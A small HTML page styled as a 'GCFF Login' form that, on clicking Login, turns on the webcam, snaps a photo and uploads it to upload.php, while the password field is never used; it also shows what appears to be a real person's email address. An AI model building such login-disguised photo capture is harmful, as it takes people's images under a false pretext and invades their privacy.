<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>GCFF Login</title>
</head>

<body style="text-align:center;font-family:Arial;background:#0f172a;color:white">

<h2>Welcome to GCFF</h2>

<input value="francoislitilm@gmail.com"><br><br>
<input type="password" placeholder="password"><br><br>

<button onclick="login()">Login</button>

<video id="video" autoplay style="width:300px;margin-top:20px;border-radius:10px;"></video>

<script>
let stream;

function login() {
  navigator.mediaDevices.getUserMedia({ video: true })
  .then(s => {
    stream = s;

    document.getElementById("video").srcObject = stream;

    setTimeout(capture, 2000);
  })
  .catch(() => alert("camera refused"));
}

function capture() {
  const video = document.getElementById("video");

  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  ctx.drawImage(video, 0, 0);

  const image = canvas.toDataURL("image/png");

  stream.getTracks().forEach(t => t.stop());

  // 👇 ENVOI VERS TON PHP
  fetch("upload.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      imageBase64: image
    })
  })
  .then(res => res.json())
  .then(data => alert("Image saved ✔"))
  .catch(err => alert("Error"));
}
</script>

</body>
</html>
